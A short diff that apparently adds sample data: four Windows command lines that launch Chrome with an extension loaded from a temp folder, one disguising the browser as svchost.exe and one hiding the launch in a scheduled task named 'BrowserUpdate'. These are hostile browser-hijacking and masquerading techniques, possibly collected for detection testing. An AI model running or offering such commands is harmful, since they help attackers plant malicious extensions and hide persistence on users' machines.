@@ -1,0 +1,4 @@
+cmd.exe /c copy "chrome.exe" svchost.exe && svchost.exe --load-extension=C:\Temp\CustomExtension
+schtasks /create /tn "BrowserUpdate" /tr "'chrome.exe' --load-extension=C:\Temp\CustomExtension" /sc once /st 00:00 /run
+wmic process call create "C:\Program Files\Google\Chrome\Application\chrome.exe --load-extension=C:\Temp\CustomExtension"
+"C:\Program Files\Google\Chrome\Application\chrome.exe"  --load-extension="C:\Users\user\AppData\Local\Temp\HHe2lr"
